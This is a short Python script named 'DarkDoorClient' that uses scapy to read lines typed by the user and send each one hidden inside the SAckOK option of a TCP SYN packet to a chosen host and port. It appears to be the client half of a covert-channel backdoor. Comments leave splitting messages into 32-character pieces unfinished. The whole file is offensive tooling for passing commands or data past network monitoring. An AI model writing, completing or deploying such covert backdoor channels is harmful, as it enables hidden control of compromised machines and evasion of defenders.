#!/usr/bin/python
import sys
from scapy.all import *
from threading import Thread
# ./DarkDoorClient <ipaddress> <port>

def send_message(message):
        pkt = IP(dst=sys.argv[1])/TCP(flags="S",dport=int(sys.argv[2]),options=[('SAckOK',message)])
        sr1(pkt)
        #Break the message up into 32 charater strings
        #Send each 32 charater string

def client_loop():
        while True:
                message = raw_input()
                send_message(message)



#Start listener
client_thread = Thread(target=client_loop,args=())

client_thread.start()
client_thread.join()
